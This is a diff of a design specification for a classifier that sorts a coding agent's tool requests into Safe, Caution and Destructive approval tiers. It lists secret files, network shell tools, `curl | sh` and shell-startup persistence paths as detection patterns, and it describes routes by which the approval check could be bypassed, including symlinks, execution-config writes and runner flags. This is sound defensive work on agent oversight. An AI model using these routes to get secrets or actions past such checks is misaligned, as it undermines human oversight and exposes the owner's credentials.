@@ -4,6 +4,8 @@ Status labels as in [02-domain.md](02-domain.md). **Decided**: the three tiers a
 
 Milestones: the classifier ships in M1 so the drawer and cards can show tier badges (read only, "Answer in your terminal"). Answering from the deck, batch, rules and the confirm checkbox ship in M3.
 
+**As built in M3** (run deck-m3a, owner decisions D-87 to D-103, [14-decisions.md](14-decisions.md) section 1.7): the classifier is `hub/server/approvals/tiers.mjs` over `hub/server/approvals/shell.mjs`, the shipped defaults are `hub/server/approvals/tiers.default.json`, answers go through `hub/server/approvals/deliver.mjs`, and rules through `hub/server/approvals/rules.mjs`. Where this document and the code disagree, the paragraphs marked "As built in M3" describe the code. The largest changes from the reviewed design: a Bash request is Safe only when its whole command is plain (D-87, section 3.2) and its paths are bare in-repo paths (D-88, section 3.4); the execution-config list grew and several named lists became fail-closed rules (D-89, D-90, D-91, D-92, section 3.5); and no tiers entry suggests a Bash prefix rule any more (D-98, D-102, D-103, sections 4.3 and 7).
+
 The request lifecycle (states, guards, verification, transition table) is specified once in [interaction/state-machines.md](interaction/state-machines.md) section 2 and the rule machine in section 2.8. This document does not restate them; it defines the policy those machines apply.
 
 ## 1. The three tiers (Decided)
@@ -57,8 +59,11 @@ classify({ toolName, toolInput, cwd, repoRoot, worktrees, homeDir, tiers }) -> {
 
 A request opened from a bare `Notification[permission_prompt]` has no `tool_input`: tier Caution, no rule candidate (state-machines 2.2, DRW-O3).
 
+As built in M3: `classify(input)` in `tiers.mjs` returns `{ tier, reasons, ruleCandidate, ruleNote, confirm: { template, count }, description }`. Each reason is `{ entryId, tier, segment, description }`; floors use ids starting with `floor.` (for example `floor.plain`, `floor.persistence`, `floor.m1`). `description` is the headline reason: the first reason at the final tier that is not a `safe.*` entry, else the first at that tier. A classifier exception rates the request Caution with the reason `classify.error`, so a hook can never wedge a session (D-92 (d)). Only the fields that carry the action feed the tier: a Bash `description` never does (F17).
+
 ### 3.2 Algorithm (Proposed)
 
+0. **Plain floor for Bash (D-87).** A Bash request can be Safe only when the whole command is plain; anything else is at least Caution (`floor.plain`). Plain means: simple commands joined only by `|`, `&&`, `||` or `;`; every word plain literal text (no `$`, backtick, glob, brace, tilde, backslash or backslash-newline, and no quote other than a single- or double-quoted string with none of those inside); no path with `..` after a component that is not `..`; no `cd`, `pushd`, `popd`, `eval`, `source`, `.`, `exec`, `trap`, compound, subshell, substitution, loop, function or heredoc; no assignment; no redirect other than `2>&1`, `>/dev/null` and `2>/dev/null`; no wrapper or payload runner (`builtin`, `command`, `env`, `sudo`, `doas`, `nice`, `nohup`, `timeout`, `stdbuf`, `ionice`, `setsid`, `xargs`, `fd -x`/`-X`, `find -exec`/`-execdir`/`-ok`/`-okdir`, `parallel` and the rest the parser knows); no option that changes the directory or repository a command acts on (`-C`, `--git-dir`, `--work-tree`, `--directory`, `--chdir`); and every simple command matches an entry of `PLAIN_COMMANDS` in `shell.mjs`, with no option between the command word and its subcommand (git keeps only `--no-pager` and `-P`). `PLAIN_COMMANDS` as built: `ls`, `pwd`, `cat`, `head`, `tail`, `wc`, `grep`, `rg`, `tree`, `stat`, `file`, `which`, `type`, `echo`, `printf`, `date`, `du`, `df`, `diff`, `cmp`, `sort`, `uniq`, `cut`, `tr`, `jq`, `yq`, `sed`, `find`, `true`, `false`, `test`, `[`; `git` with `status`, `diff`, `log`, `show`, `blame`, `rev-parse`, `ls-files`, `branch`, `remote`, `stash list`, `worktree list`, `describe`, `shortlog`, `grep`, `add`, `commit`; `cargo` with `build`, `check`, `test`, `nextest run`, `clippy`, `fmt`, `doc`, `bench`, `tree`, `metadata`, `--version`; `npm` with `test`, `run`, `ls`, `outdated`, and `pnpm` with those and `lint`; `go` with `build`, `test`, `vet`, `fmt`, `list`, `version`, `env`; `gofmt`, `golangci-lint run`, `staticcheck`, `pytest`, `ruff check`, `ruff format`, `black`, `mypy`, `pyright`, `pip list`, `pip show`; `docker` with `ps`, `images`, `logs`, `inspect`, `version`, `info`, `compose ps`, `compose logs`, `compose config`; `terraform` with `fmt`, `validate`, `version`, `providers`; `psql --version`, `sqlite3 --version`. `git config` and `fd` left the list when D-87 was narrowed. Subcommands match exactly. The full parser of 3.3 still runs on commands that are not plain, best effort, to find Destructive constructs; a miss there lowers Destructive to Caution, never to Safe. Plain is necessary for Safe, not sufficient: the entry, its option list and the rules of 3.4 and 3.5 still decide.
 1. **Pick the matcher by tool.** `Bash` goes to the shell analysis (3.3). File tools (`Edit`, `Write`, `MultiEdit`, `NotebookEdit`, `Read`) go to path analysis (3.5). `WebFetch`, `WebSearch` go to the network entries. `mcp__<server>__<tool>` goes to the MCP entries. Any other tool name goes to the tool entries, else Unknown.
 2. **Collect every matching entry.** Order in the file does not matter.
 3. **Highest tier wins**: Destructive over Caution over Safe. A Safe entry can never lower a Caution or Destructive match. This is what makes a user-added Safe pattern harmless to the defaults.
@@ -118,6 +123,15 @@ Floors apply after matching. They exist so a pattern gap cannot produce a low ti
 | Persistence: a write by a file tool, a redirect, `tee`, `cp`, `mv`, `ln`, `install`, `dd of=` or an output option to `~/.bashrc`, `~/.bash_profile`, `~/.bash_login`, `~/.bash_logout`, `~/.profile`, `~/.zshrc`, `~/.zprofile`, `~/.zshenv`, `~/.zlogin`, `~/.zlogout`, `~/.config/fish/config.fish`, `~/.config/fish/conf.d/**`, `~/.config/hypr/**` (which holds Omarchy's autostart), `~/.config/systemd/user/**` or `~/.config/autostart/**`, and nothing else | Destructive | runs at the owner's next login or shell start, outside Claude Code and the deck (F10, D-82). Writes to `~/.ssh/`, `~/.gitconfig`, `~/.config/git/` or a PATH directory are not on this floor and stay Caution "writes outside the repo" |
 | `docker run` or `podman run` with a mount source equal to `/`, `$HOME` or an ancestor of `$HOME`, or with `--privileged` | Destructive | the container can delete or rewrite the owner's files (F8) |
 | Payload wrappers `ssh`, `docker run\|exec`, `podman run\|exec`, `kubectl exec` (3.3) | Caution | the payload runs on another host or in a container (F8) |
+| A Bash command that is not plain (D-87, section 3.2) | Caution | the parser cannot prove what a non-plain command does; `floor.plain` |
+| A path operand, or the path value of an option, that is not a plain relative path inside the repo, or that has a symlink in any component (each component is checked with `lstat`; a dangling symlink counts); absolute and `~` paths even when they point inside the repo (D-88 (1)) | Caution | a cloned repo can ship symlinks to secrets or login files; absolute paths escape the repo-scope proof |
+| A recursive reader that follows symlinks: `grep -R`/`--dereference-recursive`, `rg -L`/`--follow`, `find -L`/`-follow`, `diff -r`, `tree -l`, `du -L`, `cp -L`, `tar -h` (D-88 (3)); a recursive reader with no path operand is judged on the cwd (D-88 (2)) | Caution | it can walk out of the repo through a link |
+| `sed` with a script that is not only `p`, `d`, `=`, `q`, line addresses and `s///` with the flags `g`, `p`, `I` or a number (D-88 (4)) | Caution | `e`, `w`, `r`, `R`, `W`, labels and branches run commands or touch other files |
+| `git grep` with `--untracked`, `--no-index` or `--no-exclude-standard`; `git diff` with a directory operand or outside a git work tree; `docker compose config` (D-88 (5)) | Caution | they read files outside what git tracks, or print secrets from the environment |
+| A fixer or formatter that rewrites files the agent did not name (`ruff check --fix`, `ruff format`, `cargo fmt`, `terraform fmt`, `gofmt -w` and the like), unless it runs in an explicit check or diff mode decided from the words before any `--`; any such invocation that contains `--` (D-89 (3), D-90 (a)) | Caution | it writes across the repo, including the execution-config files |
+| `go` with `-mod` other than `readonly` or `vendor` (D-89 (3)) | Caution | it rewrites `go.mod` and `go.sum` |
+| A Safe runner or checker (pytest, mypy, cargo, go, npm and the rest) whose cwd, or whose default output or cache directory, lies inside `.git` or inside a directory on the execution-config list; runner operands are cut at `::` and `[`, and an operand that does not exist is judged by its nearest existing ancestor, Caution when that is not in the repo (D-89 (3), D-90 (d)) | Caution | its output would land where git or a later build executes it |
+| A pytest or mypy word that starts with `@` (D-91 (2)) | Caution | an argument file the runner reads can carry any option |
 
 ### 3.5 File tools and repo scope (Proposed)
 
@@ -133,6 +147,18 @@ Floors apply after matching. They exist so a pattern gap cannot produce a low ti
 **Sensitive list** (F9). Caution "reads a secret file" for `Read` and for the path operands of the Bash read commands `cat`, `head`, `tail`, `less`, `grep`, `rg`, `cp`, `base64`, `xxd`, `od` and `strings`: `~/.ssh/**`, `~/.gnupg/**`, `~/.aws/**`, `~/.config/gh/**`, `~/.netrc`, `**/.env`, `**/.env.*`, `~/.claude/.credentials.json`, `~/.git-credentials`, `~/.npmrc`, `~/.pypirc`, `~/.docker/config.json`, `~/.kube/config`, `~/.config/gcloud/**`, `~/.password-store/**`, `~/.local/share/keyrings/**`, `*.pem`, `**/id_*` private keys (not `*.pub`), `**/.envrc`. A `git add` whose pathspec matches this list is Caution "stages a secret file" (F14).
 
 Safe file edits never produce a rule candidate (Proposed): Claude Code edit rules are path globs, and a repo-wide edit rule is a bigger grant than the 5 approvals that would trigger it.
+
+As built in M3 (D-88 (6), D-89, D-90, D-91, D-92):
+
+- The execution-config list (`EXECUTION_CONFIG` in `tiers.mjs`) also holds `GNUmakefile`, `BSDmakefile`, `.justfile`, `go.work`, `pytest.ini`, `.pytest.ini`, `tox.ini`, `setup.cfg`, `.coveragerc`, `mypy.ini`, `.mypy.ini`, `.golangci.yml`, `.golangci.yaml`, `.golangci.toml` and `.golangci.json` (D-89 (1)). A Bash write to any listed path is Caution as for the file tools (D-88 (6)).
+- Every name check folds the name with Unicode NFKC, then lowercase, then strips zero-width code points, so `ſ` (long s) and other compatibility forms match their ASCII names, and `.GIT/config` matches `.git/config` on a case-insensitive file system (D-89 (2), D-92 (c)).
+- A write by any tool to a file whose name ends in `.toml`, `.ini` or `.cfg`, or starts with `.`, is Caution "changes what a build, test or hook runs" when the file is at the repo root or inside a directory whose name starts with `.` (D-90 (c), reason `file.config-name`). That covers `Cargo.toml`, `pytest.toml`, `ruff.toml`, `.envrc` and future siblings without naming them. So `Edit .envrc` is Caution under this rule, although D-80 keeps `.envrc` off the named list.
+- The file tools follow D-88 (1): a target with a symlink in any component below the repo root is Caution, and the execution-config, Claude settings, `.git` and persistence checks run on both the named path and the resolved path (D-90 (b)).
+- Execution-config entries that are symlinks (`.githooks`, `.husky`, `Makefile` and the rest of the root-anchored list) are resolved once per repo, and a write whose real path lies inside a target is Caution `file.execution-config` (D-91 (3)).
+- `core.hooksPath` is read through the real git (`git config --type=path --get-all core.hooksPath` and the include targets git names, through the read-only git helper with the 08-security 4.8 flags), cached per repo and refreshed when any config file it read changes. Every hooks directory and include target found is protected like the execution-config list (D-92 (a)). A separate git dir or common dir named by a `.git` file and lying inside a repo root is protected like `.git` (D-92 (b)).
+- The `core.hooksPath` read is asynchronous, so until it lands for a repo the classifier fails closed: in a run of this task, the first `cargo test` and the first `Write src/b.rs` in a fresh repo were Caution `file.execution-config`, and the same requests 1.5 s later were Safe. The worktree list (`git worktree list --porcelain`) is cached the same way and is empty until its first read lands, so the first request from a linked worktree can be Caution with `scope.cwd` or `runner.outside` (open, see [m3-exit.md](m3-exit.md)).
+
+**Accepted residual (D-88, D-91).** The tier names intent and blast radius, not a sandbox. These stay Safe on purpose: `grep -r` and `rg -uu` printing an in-repo `.env`; `git log -p`, `git grep` and `git show` printing committed secrets; `git ls-files -s` followed by `git show <blob>`; `git remote -v`; in-repo writes to `.vscode/tasks.json` and `CLAUDE.md` (in a run of this task both were Safe once the hooks-path read had landed). A Safe runner or checker (pytest, mypy, ruff, cargo, go, npm and the rest) doing something because of in-repo content, such as test files, `conftest.py`, nested tool configs (`tests/pytest.toml`, `src/ruff.toml`), argument files or scripts it runs, is part of the same residual "in-repo writes later executed by an allowlisted runner" (D-91), not a classifier defect.
 
 ### 3.6 Non-Bash tools (Proposed)
 
@@ -153,7 +179,7 @@ The vault server key (`vault`) is the one the owner's Claude Code config uses; t
 
 ### 4.1 Location and layering (Proposed, path Decided)
 
-- Shipped defaults: `hub/server/approvals/tiers.default.json`, versioned with the deck release and covered by the classification test corpus (section 13).
+- Shipped defaults: `hub/server/approvals/tiers.default.json`, versioned with the deck release and covered by the classification test corpus (section 13). Built in M3: 384 entries (121 Safe, 156 Caution, 107 Destructive), every Destructive entry marked `floor`. The schema is `hub/server/approvals/tiers.schema.json`; `fleetmates-deck init` writes the user stub (`extends: "default"`, empty `disable` and `entries`) only when the file is missing and copies the schema beside it.
 - User file: `~/.config/fleetmates/deck/tiers.json` (Decided path), mode 0600. Created by `fleetmates-deck init` as a stub that extends the defaults. It holds only the user's additions and overrides, so deck upgrades keep improving the defaults underneath (APR-O5).
 - Effective set = defaults, minus entries the user disabled by id, plus user entries. Entries marked `"floor": true` in the defaults cannot be disabled; the floors in 3.4 are code, not data, and cannot be disabled either.
 - The file is watched. On change: parse, validate against the schema, and swap atomically. On a parse or schema error, the deck keeps the last valid set (or the shipped defaults at start), shows a Settings banner "tiers.json has an error on line 12: … Using the previous tiers." and never falls back to anything more permissive.
@@ -223,11 +249,16 @@ The vault server key (`vault`) is the one the owner's Claude Code config uses; t
 
 This is the content of `tiers.default.json`, grouped by family, with every change the tier design-oversight review proposed and the owner adopted. "Rule" is the suggested Claude Code pattern for Safe entries, written here in the canvas form `Bash(x:*)`; the writer emits whichever form the pinned Claude Code version documents ([04-integrations.md](04-integrations.md) section 2.4). Every row is subject to the floors in 3.4 and the compound handling in 3.3.
 
+As built in M3, two decisions change these tables:
+
+- **Rules (D-98, D-102, D-103).** No tiers entry carries a Bash prefix rule. The only `rule` fields left are the exact templates `Bash(npm run {script})` and `Bash(pnpm run {script})` and the five read-only vault tools of 3.6 (`mcp__vault__vault_search`, `vault_get_note`, `vault_list`, `vault_backlinks`, `vault_graph`); no entry carries `ruleNote`. The prefix rules the tables below list for cargo, `npm test`, `node --test`, go, `golangci-lint`, python and terraform were removed: D-98 for `ruff check` and `terraform fmt` (the validator treats their path operands as write targets), D-102 for every entry with a `noneArg` list or an option that writes a path or names a command (a written prefix rule skips classification, so `cargo build --config build.rustc-wrapper=...` would run under `Bash(cargo build:*)`), and D-103 for the rest (`mypy`, `golangci-lint run`, `terraform validate`), because a `:*` rule approves every option a future version adds. Those entries keep tier Safe.
+- **Plain (D-87).** A row below that names a command outside `PLAIN_COMMANDS` (3.2) can no longer give Safe for Bash: `node --test`, `python -m pytest`, `python -m py_compile`, every `npx ...` row, `uv run pytest`, `tail -f`, `fd`, `git config --get*`, the `npm -w <pkg>` and `pnpm --filter <pkg>` and `pnpm -r` forms, and any command with an assignment such as `RUST_LOG=debug cargo test` are Caution (in a run of this task: `node --test`, `python -m pytest`, `npx tsc --noEmit`, `npx vitest run`, `uv run pytest`, `fd foo src`, `git config --get user.name`, `npm -w web test`, `pnpm --filter web test`, `pnpm -r test` and `RUST_LOG=debug cargo test` all gave Caution). Their entries stay in the file and still matter where 3.2 does not apply.
+
 **General shell**
 
 | Tier | Commands | Rule |
 |---|---|---|
-| Safe | Command word plus `allowOpts` (F2); any other option falls to Caution, and `outputOpts` are write targets for the redirect rule:<br>• `ls` (`-a -A -l -h -R -1 -d -F -t -r -S --color* --group-directories-first`)<br>• `pwd` (`-L -P`)<br>• `cat` (`-n -b -A -s -E -T -v`)<br>• `head`, `tail` (`-n -c -q -v` and `-<N>`; `tail -f`/`-F` is Caution)<br>• `wc` (`-l -w -c -m -L`)<br>• `grep` (`-i -v -n -r -R -l -L -c -o -w -x -E -F -P -h -H -s -q -I -z -A -B -C -e --include=* --exclude=* --exclude-dir=* --color*`)<br>• `rg` (`-i -S -s -v -n -N -l -c -o -w -F -e -g -t -T -A -B -C -u -uu --hidden --no-ignore --files --json --color*`; `--pre`, `--pre-glob`, `-z`/`--search-zip` are Caution)<br>• `fd` (`-H -I -e -t -d -g -E -a -0 --max-depth* --color*`; `-x`, `-X`, `--exec`, `--exec-batch` give a payload with a Caution floor)<br>• `tree` (`-a -d -L -I -f -i -C --noreport`; `outputOpts` `-o`)<br>• `stat` (`-c -L -t --format=*`)<br>• `file` (`-b -i -L --mime*`)<br>• `which`, `type` (`-a`)<br>• `echo` (`-n -e -E`)<br>• `printf` (none)<br>• `date` (`-u -R -I* --iso-8601* +*`; `-s`, `--set`, `-f` are Caution)<br>• `du` (`-s -h -a -c -x -d --max-depth=*`)<br>• `df` (`-h -T -i -l -x*`)<br>• `diff` (`-u -U -r -N -q -w -b -B -i --brief --color*`)<br>• `cmp` (`-s -l -b`)<br>• `sort` (`-n -r -u -k -t -f -h -V -s -b -z`; `outputOpts` `-o`)<br>• `uniq` (`-c -d -u -i -f -s -w`; its second operand is an output target)<br>• `cut` (`-d -f -c -b -s --complement`)<br>• `tr` (`-d -s -c`)<br>• `jq` (`-r -c -e -s -S -n -M -C --arg --argjson`)<br>• `yq` (`-r -o -e -I`; `-i` is Caution)<br>• `sed` (`-n -E -r -e -z -s --posix`, Safe only under the script rule of 3.3; `-i` and `--in-place`, also abbreviated, are Caution)<br>• `find` (`-name -iname -path -ipath -type -maxdepth -mindepth -size -mtime -mmin -newer -print -print0 -empty -not ! ( ) -o -a -prune -L -H -P -regex -iregex -perm -user -group -readable`; `outputOpts` `-fprint -fprint0 -fprintf -fls`; `-exec -execdir -ok -okdir` give a payload with a Caution floor; `-delete` is Destructive)<br>• `true`, `false`, `test`, `[` (operands only) | none (read-only commands rarely prompt; no suggestion needed) |
+| Safe | Command word plus `allowOpts` (F2); any other option falls to Caution, and `outputOpts` are write targets for the redirect rule:<br>• `ls` (`-a -A -l -h -R -1 -d -F -t -r -S --color* --group-directories-first`)<br>• `pwd` (`-L -P`)<br>• `cat` (`-n -b -A -s -E -T -v`)<br>• `head`, `tail` (`-n -c -q -v` and `-<N>`; `tail -f`/`-F` is Caution)<br>• `wc` (`-l -w -c -m -L`)<br>• `grep` (`-i -v -n -r -R -l -L -c -o -w -x -E -F -P -h -H -s -q -I -z -A -B -C -e --include=* --exclude=* --exclude-dir=* --color*`)<br>• `rg` (`-i -S -s -v -n -N -l -c -o -w -F -e -g -t -T -A -B -C -u -uu --hidden --no-ignore --files --json --color*`; `--pre`, `--pre-glob`, `-z`/`--search-zip` are Caution)<br>• `fd` (`-H -I -e -t -d -g -E -a -0 --max-depth* --color*`; `-x`, `-X`, `--exec`, `--exec-batch` give a payload with a Caution floor). As built, `fd` is not in `PLAIN_COMMANDS` (D-87 narrowed), so every `fd` command is Caution or higher<br>• `tree` (`-a -d -L -I -f -i -C --noreport`; `outputOpts` `-o`)<br>• `stat` (`-c -L -t --format=*`)<br>• `file` (`-b -i -L --mime*`)<br>• `which`, `type` (`-a`)<br>• `echo` (`-n -e -E`)<br>• `printf` (none)<br>• `date` (`-u -R -I* --iso-8601* +*`; `-s`, `--set`, `-f` are Caution)<br>• `du` (`-s -h -a -c -x -d --max-depth=*`)<br>• `df` (`-h -T -i -l -x*`)<br>• `diff` (`-u -U -r -N -q -w -b -B -i --brief --color*`)<br>• `cmp` (`-s -l -b`)<br>• `sort` (`-n -r -u -k -t -f -h -V -s -b -z`; `outputOpts` `-o`)<br>• `uniq` (`-c -d -u -i -f -s -w`; its second operand is an output target)<br>• `cut` (`-d -f -c -b -s --complement`)<br>• `tr` (`-d -s -c`)<br>• `jq` (`-r -c -e -s -S -n -M -C --arg --argjson`)<br>• `yq` (`-r -o -e -I`; `-i` is Caution)<br>• `sed` (`-n -E -r -e -z -s --posix`, Safe only under the script rule of 3.3; `-i` and `--in-place`, also abbreviated, are Caution)<br>• `find` (`-name -iname -path -ipath -type -maxdepth -mindepth -size -mtime -mmin -newer -print -print0 -empty -not ! ( ) -o -a -prune -L -H -P -regex -iregex -perm -user -group -readable`; `outputOpts` `-fprint -fprint0 -fprintf -fls`; `-exec -execdir -ok -okdir` give a payload with a Caution floor; `-delete` is Destructive)<br>• `true`, `false`, `test`, `[` (operands only) | none (read-only commands rarely prompt; no suggestion needed) |
 | Caution | `sed -i`, `awk`, `perl`, `cp`, `mv`, `mkdir`, `touch`, `ln`, `chmod`, `chown`, `rmdir`, `kill`, `pkill`, `killall`, `source`, `.`, `make`, `just`, `curl`, `wget`, `ssh`, `scp`, `rsync`, `nc`, `socat`, `pacman`, `yay`, `apt`, `brew`, `systemctl --user`, scripts run by path | none |
 | Destructive | `rm` (any flags, Decided: "rm"), `shred`, `dd`, `mkfs*`, `wipefs`, `truncate`, `find -delete`, `rsync --delete*`, `rsync --del`, `rsync --remove-source-files` (F6), `systemctl` (system scope), `shutdown`, `reboot`, `crontab -r` | never |
 
@@ -235,7 +266,7 @@ This is the content of `tiers.default.json`, grouped by family, with every chang
 
 | Tier | Commands | Rule |
 |---|---|---|
-| Safe | `git status`, `diff`, `log`, `show`, `blame`, `rev-parse`, `ls-files`, `branch` (listing: no `-d -D -m -M -f`), `remote -v`, `stash list`, `worktree list`, `describe`, `shortlog`, `grep` (not `-O*`/`--open-files-in-pager`), `config --get*` | none |
+| Safe | `git status`, `diff`, `log`, `show`, `blame`, `rev-parse`, `ls-files`, `branch` (listing: no `-d -D -m -M -f`), `remote -v`, `stash list`, `worktree list`, `describe`, `shortlog`, `grep` (not `-O*`/`--open-files-in-pager`), `config --get*` (as built `git config` is not in `PLAIN_COMMANDS`, so `config --get*` is Caution, D-87 narrowed) | none |
 | Safe | `git add` with `noneArg` `-f`, `--force`; a pathspec matching the 3.5 sensitive list is Caution "stages a secret file" (APR-O3, F14) | none |
 | Safe | `git commit` with `noneArg` `--amend`, `--no-verify`, `-n` and git `-c` (APR-O3, F1, F14) | none (a prefix rule would also allow `--amend`) |
 | Caution | `git fetch`, `pull`, `clone`, `push` (plain), `checkout <branch>`, `switch`, `merge`, `rebase`, `cherry-pick`, `revert`, `commit --amend`, `commit --no-verify`, `commit -n`, `add -f`/`--force`, `rm --cached`, `grep -O*`/`--open-files-in-pager`, `stash` (push/pop/apply), `tag`, `worktree add`, `submodule`, `config` (set, other than the Destructive keys), `gc`; any git global option other than `--no-pager`, `-P` and `-C <dir inside the repo scope>` on a Safe git entry (F1); an unknown long option on `push`, `reset`, `clean`, `checkout`, `switch`, `restore`, `branch`, `rm` or `gc` (F6) | none |
@@ -247,7 +278,7 @@ This is the content of `tiers.default.json`, grouped by family, with every chang
 
 | Tier | Commands | Rule |
 |---|---|---|
-| Safe | `cargo build`, `check`, `test`, `nextest run`, `clippy`, `fmt`, `doc`, `bench`, `tree`, `metadata`, `--version`, with `noneArg` `--config`, `-Z*`, and `--target-dir` outside the repo scope (F3) | `Bash(cargo build:*)`, `Bash(cargo check:*)`, `Bash(cargo test:*)` (canvas), `Bash(cargo nextest run:*)`, `Bash(cargo clippy:*)` (canvas), `Bash(cargo fmt:*)`, each with `ruleNote: 'anyFlags'` (D-78) |
+| Safe | `cargo build`, `check`, `test`, `nextest run`, `clippy`, `fmt`, `doc`, `bench`, `tree`, `metadata`, `--version`, with `noneArg` `--config`, `-Z*`, and `--target-dir` outside the repo scope (F3) | none as built (D-102). Designed: `Bash(cargo build:*)`, `Bash(cargo check:*)`, `Bash(cargo test:*)` (canvas), `Bash(cargo nextest run:*)`, `Bash(cargo clippy:*)` (canvas), `Bash(cargo fmt:*)`, each with `ruleNote: 'anyFlags'` (D-78) |
 | Caution | `cargo run`, `add`, `remove`, `install`, `update`, `fetch`, `clean`, `generate-lockfile`, `rustup ...` | none |
 | Destructive | `cargo publish`, `cargo yank`, `cargo owner` | never |
 
@@ -255,7 +286,7 @@ This is the content of `tiers.default.json`, grouped by family, with every chang
 
 | Tier | Commands | Rule |
 |---|---|---|
-| Safe | `npm test`, `npm ls`, `npm outdated`; `npm run <script>` where the `script` field names exactly `test`, `lint`, `build`, `typecheck`, `check`, `format:check`, or a name starting with `test:`, `lint:`, `build:` or `check:` (F16; `npm run test-and-publish` and `npm run testx` are Caution); the same with `pnpm` (`pnpm test`, `pnpm lint`, `pnpm run <same names>`, `pnpm -r test`) and with `-w <pkg>` / `--filter <pkg>`; npm and pnpm with `noneArg` `--script-shell*`, `--node-options*`, `--prefix*`; `node --test` with `noneArg` `--import`, `--require`, `-r`, `--loader`, `--experimental-loader`, `--env-file*`; `npx tsc --noEmit`, `npx eslint`, `npx prettier --check`, `npx vitest run`, `npx playwright test` when the tool is a local dependency, with `noneArg` `--config*`, `-c` (F3) | `Bash(npm test:*)` (canvas) and `Bash(node --test:*)`, with `ruleNote: 'anyFlags'` (D-78); script entries suggest only the exact rule for the script that was run, `Bash(npm run test)`, `Bash(npm run test:unit)`, `Bash(pnpm run lint)`, never a prefix rule (D-86) |
+| Safe | `npm test`, `npm ls`, `npm outdated`; `npm run <script>` where the `script` field names exactly `test`, `lint`, `build`, `typecheck`, `check`, `format:check`, or a name starting with `test:`, `lint:`, `build:` or `check:` (F16; `npm run test-and-publish` and `npm run testx` are Caution); the same with `pnpm` (`pnpm test`, `pnpm lint`, `pnpm run <same names>`); as built, `pnpm -r test` and the `-w <pkg>` / `--filter <pkg>` forms are Caution, because D-87 allows no option between the command word and its subcommand (npm has no `--filter`, and `pnpm -w` takes no package); npm and pnpm with `noneArg` `--script-shell*`, `--node-options*`, `--prefix*`; `node --test` with `noneArg` `--import`, `--require`, `-r`, `--loader`, `--experimental-loader`, `--env-file*`; `npx tsc --noEmit`, `npx eslint`, `npx prettier --check`, `npx vitest run`, `npx playwright test` when the tool is a local dependency, with `noneArg` `--config*`, `-c` (F3) | script entries suggest only the exact rule for the script that was run, `Bash(npm run test)`, `Bash(npm run test:unit)`, `Bash(pnpm run lint)`, never a prefix rule (D-86). Designed and removed (D-102): `Bash(npm test:*)` (canvas) and `Bash(node --test:*)` with `ruleNote: 'anyFlags'` |
 | Caution | `npm install`/`i`/`ci`/`add`/`update`/`uninstall`, `pnpm install`/`add`/`update`/`remove`, `npm run <any other script>`, `npx <anything not above>` (may download), `node <file>`, `node -e`, `npm link`, `npm exec`. Installs that run network code stay Caution, while `curl \| sh` is Destructive (D-79) | none |
 | Destructive | `npm publish`, `pnpm publish`, `npm unpublish`, `npm deprecate`, `npm dist-tag`, `npm owner` | never |
 
@@ -265,7 +296,7 @@ This is the content of `tiers.default.json`, grouped by family, with every chang
 
 | Tier | Commands | Rule |
 |---|---|---|
-| Safe | `go build`, `go test`, `go vet`, `go fmt`, `gofmt -l`, `gofmt -d`, `go list`, `go version`, `go env` (read), `golangci-lint run`, `staticcheck`; the `go` entries with `noneArg` `-exec`, `-toolexec`, `-vettool*`, `-overlay*` (F3) | `Bash(go build:*)`, `Bash(go test:*)`, `Bash(go vet:*)`, `Bash(golangci-lint run:*)`, each with `ruleNote: 'anyFlags'` (D-78) |
+| Safe | `go build`, `go test`, `go vet`, `go fmt`, `gofmt -l`, `gofmt -d`, `go list`, `go version`, `go env` (read), `golangci-lint run`, `staticcheck`; the `go` entries with `noneArg` `-exec`, `-toolexec`, `-vettool*`, `-overlay*` (F3) | none as built (D-102, D-103). Designed: `Bash(go build:*)`, `Bash(go test:*)`, `Bash(go vet:*)`, `Bash(golangci-lint run:*)`, each with `ruleNote: 'anyFlags'` (D-78) |
 | Caution | `go run`, `go get`, `go install`, `go mod tidy`, `go mod download`, `go generate`, `gofmt -w`, `go env -w` | none |
 | Destructive | `go clean -modcache` | never |
 
@@ -273,7 +304,7 @@ This is the content of `tiers.default.json`, grouped by family, with every chang
 
 | Tier | Commands | Rule |
 |---|---|---|
-| Safe | `pytest`, `python -m pytest`, `ruff check`, `ruff format`, `black --check`, `mypy`, `pyright`, `python -m py_compile`, `pip list`, `pip show`, `uv run pytest` (unwrapped, no wrapper options, F15); the pytest entries with `noneArg` `-p`, `-c`, `--rootdir*`, `--confcutdir*` (F3) | `Bash(pytest:*)`, `Bash(python -m pytest:*)`, `Bash(ruff check:*)`, `Bash(mypy:*)`, each with `ruleNote: 'anyFlags'` (D-78) |
+| Safe | `pytest`, `python -m pytest`, `ruff check`, `ruff format`, `black --check`, `mypy`, `pyright`, `python -m py_compile`, `pip list`, `pip show`, `uv run pytest` (unwrapped, no wrapper options, F15); the pytest entries with `noneArg` `-p`, `-c`, `--rootdir*`, `--confcutdir*` (F3) | none as built (D-98, D-102, D-103). Designed: `Bash(pytest:*)`, `Bash(python -m pytest:*)`, `Bash(ruff check:*)`, `Bash(mypy:*)`, each with `ruleNote: 'anyFlags'` (D-78) |
 | Caution | `python <file>`, `python -c`, `python -m <other>`, `pip install`, `pip uninstall`, `uv add`, `uv sync`, `uv pip install`, `poetry install`, `poetry add`, `black` (writes) | none |
 | Destructive | `twine upload`, `uv publish`, `poetry publish` | never |
 
@@ -289,7 +320,7 @@ This is the content of `tiers.default.json`, grouped by family, with every chang
 
 | Tier | Commands | Rule |
 |---|---|---|
-| Safe | `terraform fmt`, `terraform fmt -check`, `terraform validate`, `terraform version`, `terraform providers` | `Bash(terraform fmt:*)`, `Bash(terraform validate:*)` |
+| Safe | `terraform fmt -check` (plain `terraform fmt` rewrites files and is Caution, D-90 (a)), `terraform validate`, `terraform version`, `terraform providers` (with no further subcommand; `terraform providers lock` is Caution) | none as built (D-98, D-103). Designed: `Bash(terraform fmt:*)`, `Bash(terraform validate:*)` |
 | Caution | `terraform init`, `plan`, `show`, `output`, `state list`, `state show`, `graph`, `workspace list`/`select`, `console` | none |
 | Destructive | `terraform apply`, `destroy`, `import`, `refresh`, `taint`, `untaint`, `state rm`/`mv`/`push`/`replace-provider`, `force-unlock`, `workspace delete` (Decided: "deploys") | never |
 
@@ -314,10 +345,10 @@ SQL matching (Proposed): strip comments and string literals, split on `;`, match
 
 | Command | Tier | Why |
 |---|---|---|
-| `cargo test --release combat::` | Safe | `safe.cargo.test`; rule candidate `Bash(cargo test:*)` |
-| `RUST_LOG=debug cargo test` | Safe | assignment stripped, `RUST_LOG` not in the env floor |
+| `cargo test --release combat::` | Safe | `safe.cargo.test`; no rule candidate as built (D-102; designed `Bash(cargo test:*)`) |
+| `RUST_LOG=debug cargo test` | Caution | as built: an assignment is not plain (D-87, `floor.plain`); designed Safe |
